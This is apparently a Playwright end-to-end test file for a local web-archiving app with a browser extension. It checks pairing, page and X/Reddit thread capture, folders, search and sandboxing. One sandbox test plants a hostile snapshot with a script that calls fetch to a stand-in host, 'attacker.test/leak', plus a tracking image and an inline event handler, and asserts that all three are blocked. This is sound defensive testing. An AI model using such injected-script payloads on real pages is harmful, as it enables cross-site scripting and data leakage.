import assert from "node:assert/strict";
import { readFile, writeFile, mkdir, rm, symlink } from "node:fs/promises";
import { spawn } from "node:child_process";
import path from "node:path";
import os from "node:os";
import { launchBrowser } from "../scripts/browser.mjs";
import { fixtureBridge } from "../scripts/fixture-bridge.mjs";
import { staticServer } from "../scripts/dev.mjs";
import { archiveResources, rewrite } from "../extension/src/archive.js";
const root = path.resolve(".test-data/e2e");
await rm(root, { recursive: true, force: true });
await mkdir(root, { recursive: true });
await mkdir("artifacts", { recursive: true });
const recording = process.env.GLASSMARK_RECORD === "1";
let nativeProcess, bridge, server, browser, context;
const checks = [];
const pass = (name) => {
  checks.push(name);
  console.log("PASS", name);
};
try {
  let connection;
  if (process.env.GLASSMARK_BRIDGE_BIN) {
    const file = root + "/connection.json";
    nativeProcess = spawn(path.resolve(process.env.GLASSMARK_BRIDGE_BIN), [], {
      env: {
        ...process.env,
        GLASSMARK_DATA: root,
        GLASSMARK_CONNECTION_FILE: file,
      },
      stdio: ["ignore", "inherit", "inherit"],
    });
    for (let i = 0; i < 100; i++) {
      try {
        connection = JSON.parse(await readFile(file, "utf8"));
        break;
      } catch {
        await new Promise((r) => setTimeout(r, 100));
      }
    }
    if (!connection) throw new Error("Native bridge did not start");
    console.log("Backend: production Rust bridge");
  } else {
    bridge = await fixtureBridge(root);
    connection = bridge.connection;
    console.log(
      "Backend: development fixture bridge (native validation requires CI)",
    );
  }
  server = await staticServer(connection);
  const call = async (endpoint, options = {}) => {
    const response = await fetch(connection.base + endpoint, {
      ...options,
      headers: {
        Authorization: "Bearer " + connection.token,
        ...options.headers,
      },
    });
    if (!response.ok) throw new Error(await response.text());
    return response;
  };
  const get = async (endpoint) => (await call(endpoint)).json();
  const post = async (endpoint, data, method = "POST") =>
    (
      await call(endpoint, {
        method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      })
    ).json();
  assert.equal((await fetch(connection.base + "/api/items")).status, 401);
  assert.equal(
    (
      await fetch(connection.base + "/health", {
        headers: { Origin: "https://attacker.test" },
      })
    ).status,
    403,
  );
  pass("unauthorized access and hostile web origins are blocked");
  const pairing = await post("/api/pairing", {});
  assert.equal(
    (
      await fetch(connection.base + "/pair", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code: "wrong" }),
      })
    ).status,
    401,
  );
  const paired = await (
    await fetch(connection.base + "/pair", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code: pairing.code, name: "E2E Chromium" }),
    })
  ).json();
  assert.ok(paired.token);
  assert.equal(
    (
      await fetch(connection.base + "/api/items", {
        headers: { Authorization: "Bearer " + paired.token },
      })
    ).status,
    403,
  );
  pass("pairing issues a scoped device token");
  if (recording) {
    const cache = path.join(os.homedir(), ".cache/ms-playwright/ffmpeg-1011");
    await mkdir(cache, { recursive: true });
    try {
      await symlink("/usr/bin/ffmpeg", cache + "/ffmpeg-linux");
    } catch {}
  }
  browser = await launchBrowser();
  context = await browser.newContext({
    viewport: { width: 1440, height: 960 },
    deviceScaleFactor: 1,
    ...(recording
      ? {
          recordVideo: {
            dir: "artifacts/raw-video",
            size: { width: 1440, height: 960 },
          },
        }
      : {}),
  });
  const errors = [];
  const page = await context.newPage();
  page.on("pageerror", (e) => errors.push(e.message));
  const source = await browser.newPage({
    viewport: { width: 1000, height: 1000 },
  });
  const captureScript = await readFile(
    "dist/extension-chromium/content.js",
    "utf8",
  );
  async function fixtureFonts() {
    const text = await source.locator("body").innerText();
    const points = [...new Set([...text].map((c) => c.codePointAt(0)))];
    const css = await readFile(
      "node_modules/@fontsource/noto-sans-sc/400.css",
      "utf8",
    );
    let embedded = "";
    for (const match of css.matchAll(/@font-face\s*\{([^}]+)\}/g)) {
      const rule = match[1];
      const ranges = [
        ...rule.matchAll(/U\+([0-9a-f]+)(?:-([0-9a-f]+))?/gi),
      ].map((m) => [parseInt(m[1], 16), parseInt(m[2] || m[1], 16)]);
      if (!points.some((p) => ranges.some(([a, b]) => p >= a && p <= b)))
        continue;
      const file = rule.match(/url\(\.\/([^)]*woff2)\)/)?.[1];
      if (!file) continue;
      const bytes = await readFile(
        "node_modules/@fontsource/noto-sans-sc/" + file,
      );
      embedded +=
        "@font-face{" +
        rule.replace(
          /src:[^;]+;/,
          `src:url(data:font/woff2;base64,${bytes.toString("base64")}) format('woff2');`,
        ) +
        "}";
    }
    await source.addStyleTag({ content: embedded });
  }
  async function collect(url, mode = "page", options = {}) {
    await source.goto(url);
    await fixtureFonts();
    await source.addStyleTag({
      content: "*{font-family:'Noto Sans SC',sans-serif!important}",
    });
    await source.evaluate(() => document.fonts.ready);
    await source.addScriptTag({ content: captureScript });
    return source.evaluate((opts) => GlassmarkCapture.collect(opts), {
      mode,
      ...options,
    });
  }
  async function save(capture) {
    const resources = await archiveResources(capture.resources, {
      approve: async () => true,
      upload: async (name, bytes, mime) => {
        await call("/api/blobs/" + name, {
          method: "PUT",
          headers: { "Content-Type": mime },
          body: bytes,
        });
      },
    });
    const item = await post("/api/items", {
      ...capture,
      snapshot: rewrite(capture.snapshot, resources),
      resources,
    });
    return item;
  }
  await page.goto("http://localhost:1420");
  await page.addStyleTag({ url: "/test-fonts/400.css" });
  await page.addStyleTag({
    content:
      "body,button,input,select{font-family:'Noto Sans SC',sans-serif!important}",
  });
  await page.evaluate(() => document.fonts.ready);
  await page.getByText("让好内容，留下来。").waitFor();
  if (recording) {
    await page.evaluate(() => {
      const note = document.createElement("div");
      note.textContent = "界面与捕获演示 · 测试网页 · 开发测试服务，非原生运行";
      note.style.cssText =
        "position:fixed;right:18px;bottom:10px;z-index:9999;font:10px sans-serif;color:#778e9d;background:#ffffffcc;padding:6px 10px;border:1px solid #dde6ec;border-radius:7px;pointer-events:none";
      document.body.append(note);
    });
    await page.waitForTimeout(1800);
  }
  const article = await collect("http://127.0.0.1:1420/fixtures/article.html");
  assert.match(article.snapshot, /把日常/);
  assert.doesNotMatch(article.snapshot, /<script/);
  assert.match(article.snapshot, /id="sky"/);
  assert.match(article.snapshot, /url\(&quot;#sky/);
  const articleItem = await save(article);
  pass(
    "full-page capture preserves computed styles, SVG fragments, fonts and source JS",
  );
  await page.locator("[data-item]").first().waitFor({ timeout: 20000 });
  await page
    .frameLocator("#snapshot")
    .getByRole("heading", { name: "把日常，过成值得收藏的风景", exact: true })
    .waitFor();
  assert.equal(await page.locator("#snapshot").getAttribute("sandbox"), "");
  if (recording) await page.waitForTimeout(3000);
  await page.screenshot({ path: "artifacts/glassmark-article.png" });
  // Multiple selected roots are combined without their unrelated siblings.
  await source.evaluate(
    () =>
      (globalThis.__glassmarkSelection = [
        document.querySelector("h1"),
        document.querySelector("blockquote"),
      ]),
  );
  const selected = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "selection" }),
  );
  assert.match(selected.text, /生活的质感/);
  assert.doesNotMatch(selected.text, /建立属于/);
  pass("multi-region capture excludes unrelated siblings");
  const firstFolder = await post("/api/folders", {
    name: "灵感花园",
    parentId: null,
  });
  const nested = await post("/api/folders", {
    name: "网页设计",
    parentId: firstFolder.id,
  });
  await post(
    "/api/items/" + articleItem.id,
    { folderId: nested.id, tags: ["设计", "日常"] },
    "PUT",
  );
  const cycle = await fetch(
    connection.base + "/api/folders/" + firstFolder.id,
    {
      method: "PUT",
      headers: {
        Authorization: "Bearer " + connection.token,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ name: "灵感花园", parentId: nested.id }),
    },
  );
  assert.equal(cycle.status, 400);
  pass("folders support nesting and reject cycles");
  await source.route("https://x.com/**", (route) =>
    route.fulfill({ contentType: "text/html", path: "tests/fixtures/x.html" }),
  );
  const x = await collect("https://x.com/lin/status/1001", "thread", {
    maxPosts: 3,
  });
  assert.equal(x.posts.length, 3);
  assert.equal(x.platform, "x");
  assert.equal(x.posts[0].authorName, "Lin");
  assert.equal(x.posts[0].stats.likes, "128");
  assert.equal(x.posts[0].media.length, 1);
  const wholeSocial = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "page" }),
  );
  assert.equal(wholeSocial.posts.length, 3);
  pass(
    "social metadata preserves author, media and metrics for both thread and full-page capture",
  );
  const xItem = await save(x);
  pass("X adapter preserves a main post and replies with their UI");
  await page.locator('[data-view="x"]').click();
  await page
    .locator(`.x-post[data-open-archive="${xItem.id}"]`)
    .waitFor({ timeout: 20000 });
  assert.equal(await page.locator("#items,.collection").count(), 0);
  assert.equal(
    await page
      .locator(".x-site-nav,.x-local-profile,.x-right,.x-feed-tabs")
      .count(),
    0,
  );
  assert.equal(
    await page.locator(".x-bookmarks-title strong").textContent(),
    "书签",
  );
  assert.equal(await page.locator("#web-folder-section").isVisible(), false);
  assert.equal(await page.locator("#snapshot").count(), 0);
  await page.screenshot({ path: "artifacts/glassmark-x.png" });
  await page.locator(`.x-post[data-open-archive="${xItem.id}"]`).click();
  assert.equal(await page.locator(".x-reply").count(), 2);
  await page.locator(".x-snapshot-link").click();
  await page
    .frameLocator("#snapshot")
    .getByText("Lin", { exact: false })
    .first()
    .waitFor();
  await page.locator("#snapshot-back").click();
  await page.getByRole("button", { name: "返回信息流", exact: true }).click();
  pass(
    "X has a dedicated timeline, thread detail and original-snapshot return path",
  );
  // Model a virtualized feed: only one DOM article exists at any point.
  await source.evaluate(() => {
    document.querySelectorAll("article").forEach((el, i) => {
      if (i) el.remove();
    });
    let next = 2000;
    window.scrollBy = () => {
      const el = document.querySelector("article");
      el.querySelector("a").href = "/user/status/" + next++;
      el.querySelector('[data-testid="tweetText"]').textContent =
        "Virtual reply " + next;
    };
  });
  const virtual = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "thread", maxPosts: 3 }),
  );
  assert.equal(virtual.posts.length, 3);
  assert.match(virtual.snapshot, /Virtual reply/);
  pass("X accumulation retains posts removed by virtual scrolling");
  await source.route("https://www.reddit.com/**", (route) =>
    route.fulfill({
      contentType: "text/html",
      path: "tests/fixtures/reddit.html",
    }),
  );
  const reddit = await collect(
    "https://www.reddit.com/r/digitalgardens/comments/abc/archive/",
    "thread",
  );
  assert.equal(reddit.posts.length, 4);
  const redditItem = await save(reddit);
  pass(
    "Reddit captures loaded post and comments without requesting hidden comments",
  );
  await page.locator('[data-view="reddit"]').click();
  await page
    .locator(`.reddit-post[data-open-archive="${redditItem.id}"]`)
    .waitFor({ timeout: 20000 });
  await page
    .locator(`.reddit-post[data-open-archive="${redditItem.id}"]`)
    .click();
  assert.equal(await page.locator(".reddit-comment").count(), 3);
  assert.match(
    await page.locator(".reddit-post-text").textContent(),
    /I've been/,
  );
  assert.doesNotMatch(
    await page.locator(".reddit-post-text").textContent(),
    /#39/,
  );
  await page.screenshot({ path: "artifacts/glassmark-reddit.png" });
  await page.getByRole("button", { name: "原始快照", exact: true }).click();
  await page
    .frameLocator("#snapshot")
    .getByRole("heading", {
      name: "What makes a personal archive actually useful?",
      exact: true,
    })
    .waitFor();
  await page.locator("#snapshot-back").click();
  await page.getByRole("button", { name: "返回信息流", exact: true }).click();
  pass(
    "Reddit has a dedicated community feed, comment tree and original-snapshot return path",
  );
  await source.evaluate(() => {
    const el = document.querySelector("shreddit-comment");
    for (let i = 0; i < 105; i++) {
      const copy = el.cloneNode(true);
      copy.setAttribute("thingid", "t1_extra_" + i);
      document.querySelector("main").append(copy);
    }
  });
  const many = await source.evaluate(() =>
    GlassmarkCapture.collect({ mode: "thread" }),
  );
  assert.equal(many.posts.length, 109);
  pass("Reddit saves all loaded comments even when more than 100 are visible");
  const duplicate = await save({ ...article, resources: [] });
  assert.notEqual(duplicate.id, articleItem.id);
  pass("repeated captures create independent archive IDs");
  await page.locator('[data-view="web"]').click();
  await page.locator("[data-item]").first().waitFor();
  await page.locator("#search").fill("生活的质感");
  await page.waitForTimeout(700);
  assert.ok(
    (await get("/api/items?q=" + encodeURIComponent("生活的质感"))).length >= 1,
  );
  await page.locator(".tree-file").first().waitFor();
  pass("full-text search finds body text, including Chinese");
  if (recording) await page.waitForTimeout(2000);
  await page.locator("#search").fill("");
  await page.waitForTimeout(700);
  await page.locator(`[data-item="${articleItem.id}"]`).click();
  await page.locator("#tag-button").click();
  await page.locator("#tag-input").fill("设计, 日常, 灵感");
  await page.getByRole("button", { name: "保存标签", exact: true }).click();
  await page.getByText("# 灵感", { exact: true }).first().waitFor();
  pass("tag editing updates the library and filters");
  await page.locator("#settings").click();
  await page.locator("#pairing-code").waitFor();
  assert.match(await page.locator("#pairing-code").textContent(), /^\d{6}$/);
  if (recording) await page.waitForTimeout(2500);
  await page.screenshot({ path: "artifacts/glassmark-settings.png" });
  await page.getByRole("button", { name: "关闭", exact: true }).click();
  // A hostile archive must remain inert and make no network requests.
  const hostile = await post("/api/items", {
    version: 1,
    title: "Sandbox test",
    url: "https://example.test",
    platform: "web",
    mode: "page",
    capturedAt: new Date().toISOString(),
    text: "sandbox",
    snapshot:
      '<html><head></head><body><script>parent.__PWNED=1;fetch("https://attacker.test/leak")</script><img src="https://attacker.test/image"><button onclick="parent.__PWNED=2">inert button</button></body></html>',
    original: "<script>saved source</script>",
    resources: [],
    posts: [],
    warnings: [],
  });
  const leaked = [];
  page.on("request", (r) => {
    if (r.url().includes("attacker.test")) leaked.push(r.url());
  });
  await page.locator(`[data-item="${hostile.id}"]`).waitFor({ timeout: 20000 });
  await page.locator(`[data-item="${hostile.id}"]`).click();
  await page.frameLocator("#snapshot").getByText("inert button").click();
  await page.waitForTimeout(300);
  assert.equal(await page.evaluate(() => globalThis.__PWNED), undefined);
  assert.equal(leaked.length, 0);
  pass("sandbox blocks scripts, event handlers and network access");
  await call("/api/items/" + hostile.id, { method: "DELETE" });
  await call("/api/items/" + duplicate.id, { method: "DELETE" });
  await page.waitForTimeout(3300);
  await page.locator(`[data-item="${articleItem.id}"]`).click();
  await page
    .frameLocator("#snapshot")
    .getByRole("heading", { name: "把日常，过成值得收藏的风景", exact: true })
    .waitFor();
  if (recording) await page.waitForTimeout(1800);
  assert.equal(await page.locator("[data-item]").count(), 1);
  await page.locator(`[data-folder="${firstFolder.id}"]`).click();
  assert.equal(await page.locator("[data-item]").count(), 1);
  assert.equal(
    await page
      .locator(
        `[data-tree-folder="${nested.id}"] > .folder-children > [data-item="${articleItem.id}"]`,
      )
      .count(),
    1,
  );
  assert.equal(await page.locator("#items,.collection").count(), 0);
  await page.locator(`[data-collapse="${firstFolder.id}"]`).click();
  assert.equal(
    await page.locator(`[data-item="${articleItem.id}"]`).count(),
    0,
  );
  assert.equal(await page.locator(`[data-folder="${nested.id}"]`).count(), 0);
  await page.locator(`[data-collapse="${firstFolder.id}"]`).click();
  assert.equal(await page.locator(`[data-folder="${nested.id}"]`).count(), 1);
  await page.locator(`[data-collapse="${nested.id}"]`).click();
  assert.equal(
    await page.locator(`[data-item="${articleItem.id}"]`).count(),
    0,
  );
  await page.locator("#search").fill("生活的质感");
  await page
    .locator(
      `[data-tree-folder="${nested.id}"] > .folder-children > [data-item="${articleItem.id}"]`,
    )
    .waitFor();
  assert.equal(
    await page
      .locator(
        `[data-tree-folder="${firstFolder.id}"] [data-tree-folder="${nested.id}"]`,
      )
      .count(),
    1,
  );
  await page.locator("#search").fill("");
  await page.waitForTimeout(700);
  if (
    (await page
      .locator(`[data-collapse="${nested.id}"]`)
      .getAttribute("aria-expanded")) === "false"
  )
    await page.locator(`[data-collapse="${nested.id}"]`).click();
  pass("search reveals matching webpage files within their ancestor folders");
  await page
    .locator(`[data-item="${articleItem.id}"]`)
    .dragTo(page.locator(`[data-folder="${firstFolder.id}"]`));
  await page
    .locator(
      `[data-tree-folder="${firstFolder.id}"] > .folder-children > [data-item="${articleItem.id}"]`,
    )
    .waitFor();
  await page
    .locator(`[data-item="${articleItem.id}"]`)
    .dragTo(page.locator(`[data-folder="${nested.id}"]`));
  await page
    .locator(
      `[data-tree-folder="${nested.id}"] > .folder-children > [data-item="${articleItem.id}"]`,
    )
    .waitFor();
  pass("dragging webpage files moves them between folder tree branches");
  const glass = await page.locator("#sidebar").evaluate((el) => ({
    background: getComputedStyle(el).backgroundColor,
    blur: getComputedStyle(el).backdropFilter,
  }));
  assert.match(glass.background, /0\.17/);
  assert.match(glass.blur, /blur/);
  pass(
    "webpage files live inside nested folders, collapse with them, and sidebar uses translucent material",
  );
  // Additional real collector outputs make the design walkthrough an actual multi-post feed.
  for (const [index, profile] of [
    {
      name: "Mia Chen",
      handle: "mia_reads",
      text: "保存网页，不只是留下一个链接。\n\n保留原来的排版、图片和讨论，未来回看的时候，才会重新遇到当时的灵感。",
      likes: "86",
    },
    {
      name: "Noah",
      handle: "noahbuilds",
      text: "A good tool should make the web feel a little more personal.\n\nLocal-first. Your files. Your folders. Your own corner of the internet.",
      likes: "214",
    },
    {
      name: "Evan",
      handle: "evan_design",
      text: "最近收集了一些关于设计与生活的讨论。\n\n比起收藏数量，更在意下一次还能不能找到。",
      likes: "52",
    },
  ].entries()) {
    await collect("https://x.com/lin/status/1001", "thread", { maxPosts: 3 });
    await source.evaluate(
      ({ index, profile }) => {
        const root = document.querySelector("article");
        root.querySelector('[data-testid="User-Name"]').innerHTML =
          profile.name + "<small>@" + profile.handle + " · 1 小时</small>";
        root.querySelector('[data-testid="tweetText"]').textContent =
          profile.text;
        root.setAttribute("data-likes", profile.likes);
        root.querySelector('a[href*="/status/"]').href =
          "/" + profile.handle + "/status/" + (3000 + index);
        if (index !== 1) root.querySelector(".photo")?.remove();
        history.replaceState(
          null,
          "",
          "/" + profile.handle + "/status/" + (3000 + index),
        );
        document.title = profile.name + " / X";
      },
      { index, profile },
    );
    const extra = await source.evaluate(() =>
      GlassmarkCapture.collect({ mode: "thread", maxPosts: 3 }),
    );
    await save(extra);
  }
  for (const [index, community] of ["LocalLLaMA", "webdev"].entries()) {
    await collect(
      "https://www.reddit.com/r/digitalgardens/comments/abc/archive/",
      "thread",
    );
    await source.evaluate(
      ({ index, community }) => {
        const post = document.querySelector("shreddit-post");
        post.setAttribute("subreddit-prefixed-name", "r/" + community);
        post.setAttribute("id", "t3_demo_" + index);
        post.querySelector("h1").textContent = index
          ? "Show your personal side projects. What are you building?"
          : "What does your local-first research workflow look like?";
        post.querySelector('[slot="text-body"]').innerHTML = index
          ? "<p>Small tools, independent projects, and things built just because you wanted them to exist. Share something you have been working on.</p>"
          : "<p>I have been building a personal library of papers, threads and useful discussions. Curious how everyone organizes their notes and saved posts.</p>";
        post.setAttribute("score", index ? "384" : "127");
        post.setAttribute("comment-count", index ? "62" : "29");
        history.replaceState(
          null,
          "",
          "/r/" + community + "/comments/demo" + index + "/archive/",
        );
        document.title =
          post.querySelector("h1").textContent + " : r/" + community;
      },
      { index, community },
    );
    await save(
      await source.evaluate(() => GlassmarkCapture.collect({ mode: "thread" })),
    );
  }
  await page.waitForTimeout(3300);
  await page.locator('[data-view="x"]').click();
  await page.locator(".x-post").first().waitFor();
  assert.equal(await page.locator(".x-post").count(), 4);
  const socialRequests = [];
  page.on("request", (r) => {
    if (/^https?:/.test(r.url()) && !/127\.0\.0\.1|localhost/.test(r.url()))
      socialRequests.push(r.url());
  });
  await page
    .locator(".x-post img[data-archive-media]")
    .first()
    .waitFor({ state: "visible" });
  await page.locator(".x-post .author-name").first().click();
  assert.equal(await page.locator(".x-post").count(), 1);
  await page.locator('[data-social-action="clear-filter"]').click();
  assert.equal(await page.locator(".x-post").count(), 4);
  await page.screenshot({ path: "artifacts/glassmark-x.png" });
  await page.locator('[data-view="reddit"]').click();
  assert.equal(await page.locator(".reddit-post").count(), 3);
  assert.equal(
    await page
      .locator(
        ".reddit-site-nav,.reddit-profile,.reddit-right,.reddit-global-header",
      )
      .count(),
    0,
  );
  assert.equal(
    await page
      .locator(
        '[data-social-action="home"],[data-social-action="focus-search"]',
      )
      .count(),
    0,
  );
  await page.locator(".saved-community").selectOption("webdev");
  assert.equal(await page.locator(".reddit-post").count(), 1);
  await page.locator(".saved-community").selectOption("");
  assert.equal(await page.locator(".reddit-post").count(), 3);
  await page.screenshot({ path: "artifacts/glassmark-reddit.png" });
  assert.equal(socialRequests.length, 0);
  pass(
    "multi-post social feeds filter authors and communities and display only archived media",
  );
  await page.locator('[data-view="web"]').click();
  assert.deepEqual(errors, []);
  pass("desktop interface has no uncaught JavaScript errors");
  const report = {
    backend: nativeProcess ? "native-rust" : "fixture-bridge",
    browser: await browser.version(),
    checks,
    recordedAt: new Date().toISOString(),
  };
  await writeFile("artifacts/e2e-report.json", JSON.stringify(report, null, 2));
  await source.close();
  await context.close();
  context = null;
  if (recording) {
    const video = await page.video().path();
    await writeFile("artifacts/video-path.txt", video);
    console.log("VIDEO", video);
  }
  console.log(`Passed ${checks.length} end-to-end checks.`);
} finally {
  if (context) await context.close();
  if (browser) await browser.close();
  if (server) await new Promise((r) => server.close(r));
  if (bridge) await new Promise((r) => bridge.server.close(r));
  nativeProcess?.kill();
}
